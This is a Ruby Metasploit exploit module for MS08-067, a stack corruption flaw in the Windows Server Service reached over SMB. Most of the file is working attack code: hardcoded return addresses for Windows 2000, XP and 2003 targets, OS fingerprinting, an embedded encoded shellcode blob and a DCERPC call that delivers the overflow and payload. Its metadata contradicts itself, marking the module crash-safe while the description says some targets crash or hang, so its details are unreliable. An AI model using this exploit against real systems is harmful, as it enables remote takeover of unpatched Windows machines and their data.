##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Brute

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MS08-067 Microsoft Server Service Relative Path Stack Corruption',
      'Description'    => %q{
        This module exploits a parsing flaw in the path canonicalization code of
        NetAPI32.dll through the Server Service. This module is capable of bypassing
        NX on some operating systems and service packs. The correct target must be
        used to prevent the Server Service (along with a dozen others in the same
        process) from crashing. Windows XP targets seem to handle multiple successful
        exploitation events, but 2003 targets will often crash or hang on subsequent
        attempts. This is just the way it is.
      },
      'Author'         => [ 'hdm', 'Brett Moore <brett.moore[at]insomniasec.com>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-4250' ],
          [ 'OSVDB', '49243' ],
          [ 'MSB', 'MS08-067' ],
          [ 'URL', 'https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067' ],
          [ 'URL', 'https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'Space'    => 400,
          'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40",
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [
            'Automatic Targeting',
            {
              'Platform' => 'win',
              'Ret'      => 0x0,
              'Offset'   => 0
            }
          ],
          [
            'Windows 2000 Universal',
            {
              'Platform' => 'win',
              'Ret'      => 0x77e14c29, # jmp esp - kernel32.dll
              'Offset'   => 60
            }
          ],
          [
            'Windows XP SP0/SP1 Universal',
            {
              'Platform' => 'win',
              'Ret'      => 0x77e14c29, # jmp esp - kernel32.dll
              'Offset'   => 61
            }
          ],
          [
            'Windows XP SP2 English (AlwaysOn NX)',
            {
              'Platform' => 'win',
              'Ret'      => 0x77f88976, # push esp; retn - ws2_32.dll
              'Offset'   => 61
            }
          ],
          [
            'Windows XP SP3 English (AlwaysOn NX)',
            {
              'Platform' => 'win',
              'Ret'      => 0x77f88976, # push esp; retn - ws2_32.dll
              'Offset'   => 61
            }
          ],
          [
            'Windows 2003 SP1 English (NO NX)',
            {
              'Platform' => 'win',
              'Ret'      => 0x77f4d5c2, # jmp esp - ws2_32.dll
              'Offset'   => 60
            }
          ],
          [
            'Windows 2003 SP2 English (NO NX)',
            {
              'Platform' => 'win',
              'Ret'      => 0x77f4d5c2, # jmp esp - ws2_32.dll
              'Offset'   => 60
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2008-10-23',
      'Notes'          =>
        {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => []
        }
    ))

    register_options([
      Opt::RPORT(445),
      OptString.new('SMBPIPE', [ true, "The pipe name to use", 'BROWSER' ]),
    ])

    deregister_options('CHOST', 'CPORT', 'SSL')
  end

  def check
    connect
    smb_login
    handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0', 'ncacn_np', ["\\#{datastore['SMBPIPE']}"])
    dcerpc_bind(handle)
    disconnect

    CheckCode::Detected
  rescue ::Exception
    CheckCode::Safe
  end

  def exploit
    connect
    smb_login

    print_status("Automatically detecting the target...")
    os_info = smb_fingerprint

    if (os_info['os'] =~ /Windows 5\.0/)
      print_status("Fingerprinted Windows 2000")
      my_target = targets[1]
    elsif (os_info['os'] =~ /Windows 5\.1/)
      if (os_info['sp'] =~ /Service Pack 0/ or os_info['sp'] =~ /Service Pack 1/)
        print_status("Fingerprinted Windows XP SP0/SP1")
        my_target = targets[2]
      elsif (os_info['sp'] =~ /Service Pack 2/)
        print_status("Fingerprinted Windows XP SP2")
        my_target = targets[3]
      elsif (os_info['sp'] =~ /Service Pack 3/)
        print_status("Fingerprinted Windows XP SP3")
        my_target = targets[4]
      else
        print_status("Fingerprinted Windows XP Unknown")
        my_target = targets[2]
      end
    elsif (os_info['os'] =~ /Windows 5\.2/)
      if (os_info['sp'] =~ /Service Pack 1/)
        print_status("Fingerprinted Windows 2003 SP1")
        my_target = targets[5]
      elsif (os_info['sp'] =~ /Service Pack 2/)
        print_status("Fingerprinted Windows 2003 SP2")
        my_target = targets[6]
      else
        print_status("Fingerprinted Windows 2003 Unknown")
        my_target = targets[5]
      end
    else
      print_error("Unable to fingerprint the target")
      disconnect
      return
    end

    if (target.name =~ /Automatic/)
      print_status("Selected Target: #{my_target.name}")
    else
      my_target = target
      print_status("Pre-selected Target: #{my_target.name}")
    end

    handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0', 'ncacn_np', ["\\#{datastore['SMBPIPE']}"])
    print_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    print_status("Bound to #{handle} ...")

    filler   = rand_text_alpha(my_target['Offset'])
    eip      = [my_target.ret].pack('V')
    align    = rand_text_alpha(4)
    shellcode = payload.encoded

    sploit = filler + eip + align + shellcode

    path =
      "\x5c\x00" + "A" * 5 + "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff" +
      "\x4f\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x11\x58\x50\x30" +
      "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42" +
      "\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x4a\x48" +
      "\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47\x4c\x4c" +
      "\x4b\x43\x4c\x45\x55\x43\x48\x45\x51\x4a\x4f\x4c\x4b\x50\x4f" +
      "\x44\x58\x4c\x4b\x51\x4f\x47\x50\x45\x51\x4a\x4b\x50\x49\x4c" +
      "\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50\x31\x49\x50\x4c\x59" +
      "\x4e\x4c\x4c\x44\x49\x50\x43\x44\x45\x57\x49\x51\x49\x5a\x44" +
      "\x4d\x43\x31\x49\x52\x4a\x4b\x4b\x44\x47\x4b\x50\x54\x47\x54" +
      "\x43\x6b\x51\x4b\x45\x31\x4a\x4b\x43\x56\x4c\x4b\x44\x4c\x50" +
      "\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c\x4b\x45\x4c" +
      "\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x46\x44\x43\x34\x49" +
      "\x53\x51\x4f\x46\x51\x4b\x46\x43\x50\x46\x36\x45\x34\x45\x54" +
      "\x43\x45\x4a\x45\x4c\x4b\x51\x4f\x47\x54\x43\x31\x4a\x4b\x43" +
      "\x56\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31" +
      "\x4a\x4b\x4b\x39\x51\x4c\x46\x44\x43\x34\x43\x34\x43\x34\x45" +
      "\x51\x4a\x4b\x4b\x46\x46\x38\x45\x58\x4c\x4b\x51\x4f\x47\x50" +
      "\x45\x51\x4a\x4b\x50\x4f\x42\x58\x4c\x4b\x46\x30\x4b\x50\x43" +
      "\x30\x45\x51\x4a\x4b\x42\x4f\x4c\x58\x50\x4c\x43\x47\x4a\x46" +
      "\x44\x47\x49\x4f\x48\x55\x4b\x59\x4a\x46\x43\x5a\x50\x50\x43" +
      "\x58\x4c\x30\x4d\x5a\x45\x54\x51\x4f\x42\x48\x4d\x48\x4b\x4e" +
      "\x4d\x5a\x44\x4e\x50\x57\x4b\x4f\x4a\x47\x42\x43\x43\x51\x42" +
      "\x4c\x43\x53\x43\x30\x41\x41" + sploit + "\x5c\x00"

    print_status("Sending exploit...")

    begin
      stub =
        NDR.uwstring(path) +
        NDR.long(rand(1024)) +
        NDR.long(1) +
        NDR.long(rand(1024)) +
        NDR.long(0) +
        NDR.long(0)
      dcerpc_call(0x1f, stub)
    rescue Rex::Proto::DCERPC::Exceptions::NoResponse, ::EOFError
      print_good('Server did not respond, this is expected')
    rescue => e
      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
        print_good('Server disconnected, this is expected')
      else
        raise e
      end
    end

    handler
    disconnect
  end
end